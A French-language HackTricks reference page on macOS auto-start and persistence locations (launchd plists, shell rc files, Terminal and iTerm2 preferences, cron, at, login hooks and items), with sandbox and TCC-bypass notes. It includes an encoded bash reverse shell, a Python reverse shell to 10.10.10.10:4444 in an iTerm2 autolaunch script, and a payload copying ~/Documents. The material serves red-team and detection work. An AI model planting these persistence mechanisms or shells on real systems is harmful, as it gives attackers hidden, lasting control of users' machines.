# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Cette section est fortement basée sur la série de blogs [**Au-delà des bons vieux LaunchAgents**](https://theevilbit.github.io/beyond/), l'objectif est d'ajouter **plus d'emplacements de démarrage automatique** (si possible), d'indiquer **quelles techniques fonctionnent encore** de nos jours avec la dernière version de macOS (13.4) et de spécifier les **permissions** nécessaires.

## Contournement de Sandbox

> [!TIP]
> Ici, vous pouvez trouver des emplacements de démarrage utiles pour le **contournement de sandbox** qui vous permet d'exécuter simplement quelque chose en **l'écrivant dans un fichier** et en **attendant** une **action très** **courante**, une **durée déterminée** ou une **action que vous pouvez généralement effectuer** de l'intérieur d'une sandbox sans avoir besoin de permissions root.

### Launchd

- Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacements

- **`/Library/LaunchAgents`**
- **Déclencheur** : Redémarrage
- Root requis
- **`/Library/LaunchDaemons`**
- **Déclencheur** : Redémarrage
- Root requis
- **`/System/Library/LaunchAgents`**
- **Déclencheur** : Redémarrage
- Root requis
- **`/System/Library/LaunchDaemons`**
- **Déclencheur** : Redémarrage
- Root requis
- **`~/Library/LaunchAgents`**
- **Déclencheur** : Nouvelle connexion
- **`~/Library/LaunchDemons`**
- **Déclencheur** : Nouvelle connexion

> [!TIP]
> En fait intéressant, **`launchd`** a une liste de propriétés intégrée dans la section Mach-o `__Text.__config` qui contient d'autres services bien connus que launchd doit démarrer. De plus, ces services peuvent contenir `RequireSuccess`, `RequireRun` et `RebootOnSuccess`, ce qui signifie qu'ils doivent être exécutés et se terminer avec succès.
>
> Bien sûr, cela ne peut pas être modifié en raison de la signature de code.

#### Description & Exploitation

**`launchd`** est le **premier** **processus** exécuté par le noyau OX S au démarrage et le dernier à se terminer lors de l'arrêt. Il doit toujours avoir le **PID 1**. Ce processus va **lire et exécuter** les configurations indiquées dans les **plists** **ASEP** dans :

- `/Library/LaunchAgents` : Agents par utilisateur installés par l'administrateur
- `/Library/LaunchDaemons` : Daemons à l'échelle du système installés par l'administrateur
- `/System/Library/LaunchAgents` : Agents par utilisateur fournis par Apple.
- `/System/Library/LaunchDaemons` : Daemons à l'échelle du système fournis par Apple.

Lorsqu'un utilisateur se connecte, les plists situées dans `/Users/$USER/Library/LaunchAgents` et `/Users/$USER/Library/LaunchDemons` sont démarrées avec les **permissions des utilisateurs connectés**.

La **principale différence entre les agents et les daemons est que les agents sont chargés lorsque l'utilisateur se connecte et que les daemons sont chargés au démarrage du système** (car il y a des services comme ssh qui doivent être exécutés avant qu'un utilisateur n'accède au système). De plus, les agents peuvent utiliser l'interface graphique tandis que les daemons doivent s'exécuter en arrière-plan.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Il existe des cas où un **agent doit être exécuté avant que l'utilisateur ne se connecte**, ceux-ci sont appelés **PreLoginAgents**. Par exemple, cela est utile pour fournir une technologie d'assistance à la connexion. Ils peuvent également être trouvés dans `/Library/LaunchAgents` (voir [**ici**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un exemple).

> [!NOTE]
> De nouveaux fichiers de configuration de Daemons ou d'Agents seront **chargés après le prochain redémarrage ou en utilisant** `launchctl load <target.plist>` Il est **également possible de charger des fichiers .plist sans cette extension** avec `launchctl -F <file>` (cependant, ces fichiers plist ne seront pas chargés automatiquement après le redémarrage).\
> Il est également possible de **décharger** avec `launchctl unload <target.plist>` (le processus pointé par celui-ci sera terminé),
>
> Pour **s'assurer** qu'il n'y a **rien** (comme un remplacement) **empêchant** un **Agent** ou un **Daemon** **de** **s'exécuter**, exécutez : `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Listez tous les agents et daemons chargés par l'utilisateur actuel :
```bash
launchctl list
```
> [!WARNING]
> Si un plist appartient à un utilisateur, même s'il se trouve dans des dossiers de démon à l'échelle du système, la **tâche sera exécutée en tant qu'utilisateur** et non en tant que root. Cela peut empêcher certaines attaques d'escalade de privilèges.

#### Plus d'infos sur launchd

**`launchd`** est le **premier** processus en mode utilisateur qui est démarré depuis le **noyau**. Le démarrage du processus doit être **réussi** et il **ne peut pas se terminer ou planter**. Il est même **protégé** contre certains **signaux de terminaison**.

L'une des premières choses que `launchd` ferait est de **démarrer** tous les **démons** comme :

- **Démons de minuterie** basés sur le temps à exécuter :
- atd (`com.apple.atrun.plist`) : A un `StartInterval` de 30min
- crond (`com.apple.systemstats.daily.plist`) : A `StartCalendarInterval` pour démarrer à 00:15
- **Démons réseau** comme :
- `org.cups.cups-lpd` : Écoute en TCP (`SockType: stream`) avec `SockServiceName: printer`
- SockServiceName doit être soit un port soit un service de `/etc/services`
- `com.apple.xscertd.plist` : Écoute en TCP sur le port 1640
- **Démons de chemin** qui sont exécutés lorsqu'un chemin spécifié change :
- `com.apple.postfix.master` : Vérifie le chemin `/etc/postfix/aliases`
- **Démons de notifications IOKit** :
- `com.apple.xartstorageremoted` : `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Port Mach :**
- `com.apple.xscertd-helper.plist` : Indique dans l'entrée `MachServices` le nom `com.apple.xscertd.helper`
- **UserEventAgent :**
- Cela est différent du précédent. Il fait en sorte que launchd lance des applications en réponse à un événement spécifique. Cependant, dans ce cas, le binaire principal impliqué n'est pas `launchd` mais `/usr/libexec/UserEventAgent`. Il charge des plugins depuis le dossier restreint par SIP /System/Library/UserEventPlugins/ où chaque plugin indique son initialiseur dans la clé `XPCEventModuleInitializer` ou, dans le cas de plugins plus anciens, dans le dictionnaire `CFPluginFactories` sous la clé `FB86416D-6164-2070-726F-70735C216EC0` de son `Info.plist`.

### fichiers de démarrage shell

Writeup : [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm) : [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement TCC : [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez trouver une application avec un contournement TCC qui exécute un shell qui charge ces fichiers

#### Emplacements

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Déclencheur** : Ouvrir un terminal avec zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Déclencheur** : Ouvrir un terminal avec zsh
- Root requis
- **`~/.zlogout`**
- **Déclencheur** : Quitter un terminal avec zsh
- **`/etc/zlogout`**
- **Déclencheur** : Quitter un terminal avec zsh
- Root requis
- Potentiellement plus dans : **`man zsh`**
- **`~/.bashrc`**
- **Déclencheur** : Ouvrir un terminal avec bash
- `/etc/profile` (n'a pas fonctionné)
- `~/.profile` (n'a pas fonctionné)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Déclencheur** : Attendu pour se déclencher avec xterm, mais il **n'est pas installé** et même après installation, cette erreur est lancée : xterm : `DISPLAY is not set`

#### Description & Exploitation

Lors de l'initiation d'un environnement shell tel que `zsh` ou `bash`, **certains fichiers de démarrage sont exécutés**. macOS utilise actuellement `/bin/zsh` comme shell par défaut. Ce shell est automatiquement accessible lorsque l'application Terminal est lancée ou lorsqu'un appareil est accédé via SSH. Bien que `bash` et `sh` soient également présents dans macOS, ils doivent être explicitement invoqués pour être utilisés.

La page de manuel de zsh, que nous pouvons lire avec **`man zsh`**, a une longue description des fichiers de démarrage.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applications Rouverts

> [!CAUTION]
> Configurer l'exploitation indiquée et se déconnecter puis se reconnecter ou même redémarrer n'a pas fonctionné pour moi pour exécuter l'application. (L'application n'était pas exécutée, peut-être qu'elle doit être en cours d'exécution lorsque ces actions sont effectuées)

**Écriture** : [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Déclencheur** : Redémarrer les applications rouverts

#### Description & Exploitation

Toutes les applications à rouvrir se trouvent dans le plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Donc, pour faire en sorte que les applications rouverts lancent la vôtre, vous devez simplement **ajouter votre application à la liste**.

Le UUID peut être trouvé en listant ce répertoire ou avec `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Pour vérifier les applications qui seront rouverts, vous pouvez faire :
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Pour **ajouter une application à cette liste**, vous pouvez utiliser :
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Préférences du Terminal

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement TCC : [✅](https://emojipedia.org/check-mark-button)
- Utilisation du Terminal pour avoir les permissions FDA de l'utilisateur qui l'utilise

#### Emplacement

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Déclencheur** : Ouvrir le Terminal

#### Description & Exploitation

Dans **`~/Library/Preferences`** sont stockées les préférences de l'utilisateur dans les Applications. Certaines de ces préférences peuvent contenir une configuration pour **exécuter d'autres applications/scripts**.

Par exemple, le Terminal peut exécuter une commande au démarrage :

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Cette configuration est reflétée dans le fichier **`~/Library/Preferences/com.apple.Terminal.plist`** comme ceci :
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Donc, si le plist des préférences du terminal dans le système peut être écrasé, la fonctionnalité **`open`** peut être utilisée pour **ouvrir le terminal et cette commande sera exécutée**.

Vous pouvez ajouter cela depuis le cli avec :
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Scripts de terminal / Autres extensions de fichiers

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement TCC : [✅](https://emojipedia.org/check-mark-button)
- Utilisation du terminal pour avoir les permissions FDA de l'utilisateur qui l'utilise

#### Emplacement

- **Partout**
- **Déclencheur** : Ouvrir le terminal

#### Description & Exploitation

Si vous créez un [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) et l'ouvrez, l'**application Terminal** sera automatiquement invoquée pour exécuter les commandes indiquées. Si l'application Terminal a des privilèges spéciaux (comme TCC), votre commande sera exécutée avec ces privilèges spéciaux.

Essayez-le avec :
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Vous pouvez également utiliser les extensions **`.command`**, **`.tool`**, avec du contenu de scripts shell réguliers et ils seront également ouverts par Terminal.

> [!CAUTION]
> Si le terminal a **Full Disk Access**, il pourra compléter cette action (notez que la commande exécutée sera visible dans une fenêtre de terminal).

### Plugins Audio

Écriture : [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Écriture : [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement TCC : [🟠](https://emojipedia.org/large-orange-circle)
- Vous pourriez obtenir un accès TCC supplémentaire

#### Emplacement

- **`/Library/Audio/Plug-Ins/HAL`**
- Accès root requis
- **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
- **`/Library/Audio/Plug-ins/Components`**
- Accès root requis
- **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
- **`~/Library/Audio/Plug-ins/Components`**
- **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
- **`/System/Library/Components`**
- Accès root requis
- **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur

#### Description

Selon les écrits précédents, il est possible de **compiler certains plugins audio** et de les charger.

### Plugins QuickLook

Écriture : [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement TCC : [🟠](https://emojipedia.org/large-orange-circle)
- Vous pourriez obtenir un accès TCC supplémentaire

#### Emplacement

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

Les plugins QuickLook peuvent être exécutés lorsque vous **déclenchez l'aperçu d'un fichier** (appuyez sur la barre d'espace avec le fichier sélectionné dans Finder) et qu'un **plugin prenant en charge ce type de fichier** est installé.

Il est possible de compiler votre propre plugin QuickLook, de le placer dans l'un des emplacements précédents pour le charger, puis d'aller à un fichier pris en charge et d'appuyer sur la barre d'espace pour le déclencher.

### ~~Hooks de Connexion/Déconnexion~~

> [!CAUTION]
> Cela n'a pas fonctionné pour moi, ni avec le LoginHook de l'utilisateur ni avec le LogoutHook root

**Écriture** : [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Vous devez être capable d'exécuter quelque chose comme `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Ils sont obsolètes mais peuvent être utilisés pour exécuter des commandes lorsqu'un utilisateur se connecte.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Ce paramètre est stocké dans `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Pour le supprimer :
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
L'utilisateur root est stocké dans **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Contournement conditionnel du bac à sable

> [!TIP]
> Ici, vous pouvez trouver des emplacements de démarrage utiles pour le **contournement du bac à sable** qui vous permet d'exécuter simplement quelque chose en **l'écrivant dans un fichier** et en **attendant des conditions pas très courantes** comme des **programmes spécifiques installés, des actions d'utilisateur "inhabituelles"** ou des environnements.

### Cron

**Écriture**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Utile pour contourner le bac à sable: [✅](https://emojipedia.org/check-mark-button)
- Cependant, vous devez être capable d'exécuter le binaire `crontab`
- Ou être root
- Contournement TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root requis pour un accès en écriture direct. Pas de root requis si vous pouvez exécuter `crontab <file>`
- **Déclencheur**: Dépend du travail cron

#### Description & Exploitation

Listez les travaux cron de l'**utilisateur actuel** avec:
```bash
crontab -l
```
Vous pouvez également voir tous les cron jobs des utilisateurs dans **`/usr/lib/cron/tabs/`** et **`/var/at/tabs/`** (nécessite les droits root).

Dans MacOS, plusieurs dossiers exécutant des scripts avec **une certaine fréquence** peuvent être trouvés dans :
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Là, vous pouvez trouver les **cron** **jobs** réguliers, les **at** **jobs** (peu utilisés) et les **periodic** **jobs** (principalement utilisés pour nettoyer les fichiers temporaires). Les **periodic** **jobs** quotidiens peuvent être exécutés par exemple avec : `periodic daily`.

Pour ajouter un **user cronjob programmatically**, il est possible d'utiliser :
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement TCC : [✅](https://emojipedia.org/check-mark-button)
- iTerm2 avait des autorisations TCC accordées

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Déclencheur** : Ouvrir iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Déclencheur** : Ouvrir iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Déclencheur** : Ouvrir iTerm

#### Description & Exploitation

Les scripts stockés dans **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** seront exécutés. Par exemple :
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ou :
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Le script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sera également exécuté :
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Les préférences d'iTerm2 situées dans **`~/Library/Preferences/com.googlecode.iterm2.plist`** peuvent **indiquer une commande à exécuter** lorsque le terminal iTerm2 est ouvert.

Ce paramètre peut être configuré dans les paramètres d'iTerm2 :

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Et la commande est reflétée dans les préférences :
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Vous pouvez définir la commande à exécuter avec :
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Il est très probable qu'il existe **d'autres moyens d'abuser des préférences d'iTerm2** pour exécuter des commandes arbitraires.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais xbar doit être installé
- Contournement TCC : [✅](https://emojipedia.org/check-mark-button)
- Il demande des autorisations d'accessibilité

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Déclencheur** : Une fois xbar exécuté

#### Description

Si le programme populaire [**xbar**](https://github.com/matryer/xbar) est installé, il est possible d'écrire un script shell dans **`~/Library/Application\ Support/xbar/plugins/`** qui sera exécuté lorsque xbar sera démarré :
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Écriture**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais Hammerspoon doit être installé
- Contournement TCC : [✅](https://emojipedia.org/check-mark-button)
- Il demande des autorisations d'accessibilité

#### Emplacement

- **`~/.hammerspoon/init.lua`**
- **Déclencheur** : Une fois Hammerspoon exécuté

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) sert de plateforme d'automatisation pour **macOS**, tirant parti du **langage de script LUA** pour ses opérations. Notamment, il prend en charge l'intégration de code AppleScript complet et l'exécution de scripts shell, améliorant considérablement ses capacités de script.

L'application recherche un seul fichier, `~/.hammerspoon/init.lua`, et lorsque démarré, le script sera exécuté.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais BetterTouchTool doit être installé
- Contournement TCC : [✅](https://emojipedia.org/check-mark-button)
- Il demande des autorisations d'Automatisation-Courts et d'Accessibilité

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Cet outil permet d'indiquer des applications ou des scripts à exécuter lorsque certains raccourcis sont pressés. Un attaquant pourrait être en mesure de configurer son propre **raccourci et action à exécuter dans la base de données** pour exécuter du code arbitraire (un raccourci pourrait consister simplement à appuyer sur une touche).

### Alfred

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais Alfred doit être installé
- Contournement TCC : [✅](https://emojipedia.org/check-mark-button)
- Il demande des autorisations d'Automatisation, d'Accessibilité et même d'accès complet au disque

#### Location

- `???`

Il permet de créer des flux de travail qui peuvent exécuter du code lorsque certaines conditions sont remplies. Potentiellement, il est possible pour un attaquant de créer un fichier de flux de travail et de faire charger ce fichier par Alfred (il est nécessaire de payer la version premium pour utiliser les flux de travail).

### SSHRC

Writeup : [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais ssh doit être activé et utilisé
- Contournement TCC : [✅](https://emojipedia.org/check-mark-button)
- L'utilisation de SSH nécessite un accès FDA

#### Location

- **`~/.ssh/rc`**
- **Déclencheur** : Connexion via ssh
- **`/etc/ssh/sshrc`**
- Accès root requis
- **Déclencheur** : Connexion via ssh

> [!CAUTION]
> Pour activer ssh, un accès complet au disque est requis :
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Par défaut, sauf si `PermitUserRC no` dans `/etc/ssh/sshd_config`, lorsque un utilisateur **se connecte via SSH**, les scripts **`/etc/ssh/sshrc`** et **`~/.ssh/rc`** seront exécutés.

### **Login Items**

Writeup : [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez exécuter `osascript` avec des arguments
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Déclencheur :** Connexion
- Charge utile d'exploitation stockée appelant **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Déclencheur :** Connexion
- Accès root requis

#### Description

Dans Préférences Système -> Utilisateurs et groupes -> **Éléments de connexion**, vous pouvez trouver **des éléments à exécuter lorsque l'utilisateur se connecte**.\
Il est possible de les lister, d'ajouter et de supprimer depuis la ligne de commande :
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ces éléments sont stockés dans le fichier **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Les **éléments de connexion** peuvent **également** être indiqués en utilisant l'API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) qui stockera la configuration dans **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP en tant qu'élément de connexion

(Voir la section précédente sur les éléments de connexion, ceci est une extension)

Si vous stockez un fichier **ZIP** en tant qu'**élément de connexion**, l'**`Archive Utility`** l'ouvrira et si le zip était par exemple stocké dans **`~/Library`** et contenait le dossier **`LaunchAgents/file.plist`** avec un backdoor, ce dossier sera créé (il ne l'est pas par défaut) et le plist sera ajouté afin que la prochaine fois que l'utilisateur se connecte, le **backdoor indiqué dans le plist sera exécuté**.

Une autre option serait de créer les fichiers **`.bash_profile`** et **`.zshenv`** dans le HOME de l'utilisateur, donc si le dossier LaunchAgents existe déjà, cette technique fonctionnerait toujours.

### At

Écriture : [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez **exécuter** **`at`** et cela doit être **activé**
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Besoin de **exécuter** **`at`** et cela doit être **activé**

#### **Description**

Les tâches `at` sont conçues pour **planifier des tâches uniques** à exécuter à certains moments. Contrairement aux tâches cron, les tâches `at` sont automatiquement supprimées après exécution. Il est crucial de noter que ces tâches persistent à travers les redémarrages du système, les marquant comme des préoccupations potentielles en matière de sécurité dans certaines conditions.

Par **défaut**, elles sont **désactivées** mais l'utilisateur **root** peut **les activer** avec :
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Cela créera un fichier dans 1 heure :
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Vérifiez la file d'attente des tâches en utilisant `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Au-dessus, nous pouvons voir deux tâches planifiées. Nous pouvons imprimer les détails de la tâche en utilisant `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
